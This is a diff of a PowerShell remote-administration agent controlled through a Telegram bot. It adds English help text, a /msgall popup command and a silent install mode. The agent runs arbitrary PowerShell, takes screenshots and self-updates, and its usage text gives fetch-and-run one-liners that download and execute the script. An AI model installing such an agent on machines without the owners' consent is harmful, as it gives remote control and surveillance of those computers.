+                                Send-Telegram "[$PCName] Usage: /msgall <text>`n(e.g. /msgall Backup now!)"
                             }
                         }
                         '/exec' {
@@ -647,7 +765,7 @@ Add-Type -AssemblyName System.Windows.Forms
                                 $result = Invoke-Exec -Command $restText
                                 Send-Telegram "[$PCName] > $restText`:`n$result"
                             } else {
-                                Send-Telegram "[$PCName] Cu phap: /exec @pc <lenh PowerShell>"
+                                Send-Telegram "[$PCName] Usage: /exec @pc <PowerShell command>"
                             }
                         }
                         '/update' {
@@ -658,27 +776,28 @@ Add-Type -AssemblyName System.Windows.Forms
                                 $lines = Get-Content $LogPath -Tail 50
                                 $text = ($lines -join "`n")
                                 if ($text.Length -gt 3900) { $text = $text.Substring($text.Length - 3900) }
-                                Send-Telegram "[$PCName] Log 50 dong cuoi:`n`n$text"
+                                Send-Telegram "[$PCName] Last 50 log lines:`n`n$text"
                             } else {
-                                Send-Telegram "[$PCName] Chua co log file"
+                                Send-Telegram "[$PCName] No log file yet"
                             }
                         }
                         '/help' {
                             $help = @"
-[$PCName] *Lenh available:*
-/shutdown [pc]      - Tat may
-/restart  [pc]      - Khoi dong lai
-/lock     [pc]      - Khoa man hinh
-/status   [pc]      - Thong tin PC
-/screenshot [pc]    - Chup man hinh
-/msg   @pc <text>   - Hien thi popup (can @)
-/exec  @pc <cmd>    - Chay lenh PowerShell (can @)
-/update  [pc]       - Tu update tu GitHub
-/log     [pc]       - Xem 50 dong log cuoi
-/help               - Hien thi lenh
+[$PCName] *Available commands:*
+/shutdown [pc]      - Power off machine
+/restart  [pc]      - Restart machine
+/lock     [pc]      - Lock screen
+/status   [pc]      - PC info (IP, OS, CPU, RAM, uptime)
+/screenshot [pc]    - Capture screen (full, DPI-aware)
+/msg   @pc <text>   - Show popup on ONE PC (requires @)
+/msgall <text>      - Show popup on ALL PCs
+/exec  @pc <cmd>    - Run PowerShell command (requires @)
+/update  [pc]       - Self-update from GitHub
+/log     [pc]       - Show last 50 log lines
+/help               - Show this help
 
-[pc] = ten PC (vd: PC-VanPhong), bo qua = TAT CA PC.
-/exec va /msg can dung @pc de phan biet voi text lenh.
+[pc] = PC name (e.g. PC-Office), omit = ALL PCs.
+/msg and /exec REQUIRE @pc. /msgall does not need @pc.
 "@
                             Send-Telegram $help
                         }
@@ -698,7 +817,7 @@ Add-Type -AssemblyName System.Windows.Forms
 # DISPATCH (must be AFTER all block definitions above)
 # =====================================================================
 function Pause-Exit {
-    param([string]$Msg = 'Nhan Enter de thoat...')
+    param([string]$Msg = 'Press Enter to exit...')
     Write-Host ''
     try { Read-Host $Msg | Out-Null } catch { }
 }
@@ -708,18 +827,18 @@ if ($Install) {
         & $InstallBlock
         $code = $LASTEXITCODE
         if ($null -eq $code) { $code = 0 }
-        Pause-Exit
+        if (-not $Silent) { Pause-Exit }
         exit $code
     } catch {
-        Write-Host ''
-        Write-Host '===================================================' -ForegroundColor Red
-        Write-Host ' LOI KHI CAI DAT:' -ForegroundColor Red
-        Write-Host '===================================================' -ForegroundColor Red
-        Write-Host $_.Exception.Message -ForegroundColor Yellow
-        Write-Host ''
-        Write-Host 'Stack trace:' -ForegroundColor DarkGray
-        Write-Host $_.ScriptStackTrace -ForegroundColor DarkGray
-        Pause-Exit 'Nhan Enter de thoat...'
+        Write-Msg ''
+        Write-Msg '===================================================' -Color Red
+        Write-Msg ' INSTALL ERROR:' -Color Red
+        Write-Msg '===================================================' -Color Red
+        Write-Msg $_.Exception.Message -Color Yellow
+        Write-Msg ''
+        Write-Msg 'Stack trace:' -Color DarkGray
+        Write-Msg $_.ScriptStackTrace -Color DarkGray
+        if (-not $Silent) { Pause-Exit 'Press Enter to exit...' }
         exit 1
     }
 }
@@ -727,15 +846,15 @@ if ($Install) {
 if ($Uninstall) {
     try {
         & $UninstallBlock
-        Pause-Exit
+        if (-not $Silent) { Pause-Exit }
         exit 0
     } catch {
-        Write-Host ''
-        Write-Host '===================================================' -ForegroundColor Red
-        Write-Host ' LOI KHI GO CAI:' -ForegroundColor Red
-        Write-Host '===================================================' -ForegroundColor Red
-        Write-Host $_.Exception.Message -ForegroundColor Yellow
-        Pause-Exit 'Nhan Enter de thoat...'
+        Write-Msg ''
+        Write-Msg '===================================================' -Color Red
+        Write-Msg ' UNINSTALL ERROR:' -Color Red
+        Write-Msg '===================================================' -Color Red
+        Write-Msg $_.Exception.Message -Color Yellow
+        if (-not $Silent) { Pause-Exit 'Press Enter to exit...' }
         exit 1
     }
 }
@@ -744,23 +863,26 @@ if ($Run) {
     try {
         & $AgentBlock
     } catch {
+        # Agent loop should never exit cleanly; if we get here, log and restart
         Start-Sleep -Seconds 10
         exit 1
     }
     exit 0
 }
 
-# Default: show help
-Write-Host ''
-Write-Host '=== PCAgent - Usage ===' -ForegroundColor Cyan
-Write-Host ''
-Write-Host 'Cai dat (1 lenh, chay as Admin):'
-Write-Host "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Install -BotToken '123:ABC' -ChatId '123456' -PCName 'PC-VanPhong'"
-Write-Host ''
-Write-Host 'Hoac interactive (se hoi token/chatid/pcname):'
-Write-Host "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Install"
-Write-Host ''
-Write-Host 'Go cai:'
-Write-Host "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Uninstall"
-Write-Host ''
+# Default: show help (only if not silent)
+if (-not $Silent) {
+    Write-Msg ''
+    Write-Msg '=== SuperAgent - Usage ===' -Color Cyan
+    Write-Msg ''
+    Write-Msg 'Install (silent, recommended):'
+    Write-Msg "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Install -Silent -BotToken '123:ABC' -ChatId '123456' -PCName 'PC-Office'"
+    Write-Msg ''
+    Write-Msg 'Install (interactive, will prompt for params):'
+    Write-Msg "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Install"
+    Write-Msg ''
+    Write-Msg 'Uninstall (silent):'
+    Write-Msg "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Uninstall -Silent"
+    Write-Msg ''
+}
 exit 0
